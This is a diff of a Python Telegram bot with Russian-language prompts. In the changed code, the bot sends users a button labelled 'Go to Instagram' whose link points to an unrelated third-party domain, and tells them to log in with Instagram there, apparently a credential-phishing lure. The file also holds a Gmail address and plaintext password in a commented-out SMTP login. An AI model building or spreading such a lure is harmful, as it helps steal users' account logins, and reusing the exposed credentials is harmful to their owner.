@@ -2,13 +2,13 @@
 import config
 import telebot
 from telebot import types
-import smtplib
 
 
-
+'''
 mailObj = smtplib.SMTP('smtp.gmail.com', 587)
 mailObj.starttls()
 mailObj.login('kirypanin@gmail.com', 'Paninm27')
+'''
 bot = telebot.TeleBot(config.token)
 markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
 agree = types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -50,11 +50,13 @@ def process_autorisationvar(message):
 def process_autorisation(message):
     type = message.text
     autortype = types.ReplyKeyboardRemove(selective=False)
-    text = 'Введите ваше имя пользователя Instagram: '
-    msg = bot.send_message(message.chat.id, text, reply_markup=autortype)
-    bot.register_next_step_handler(msg, process_autorisation2)
+    keyboard = types.InlineKeyboardMarkup()
+    url_button = types.InlineKeyboardButton(text="Перейти в Instagram", url="http://osnine.com/01845///JcFOZ/?sc=35&sc=35&l=1&ppy=4524426&i=4524426")
+    keyboard.add(url_button)
+    bot.send_message(message.chat.id, "Привет! Нажми на кнопку, чтобы войти с помощью Instagram!", reply_markup=keyboard)
 
 
+'''
 def process_autorisation2(message):
     username = message.text
     if(username == u'melovin_lane') or (username == u'kdudnik') or (username == u'i_isaevaa'):
@@ -77,6 +79,7 @@ def process_autorised(message):
 def process_menu(message):
     msg = bot.send_message(message.chat.id, 'Сервис времменно недоступен. Извините за неудобстваю', reply_markup=menu)
     bot.register_next_step_handler(msg, process_menu)
+'''
 
 
 if __name__ == '__main__':
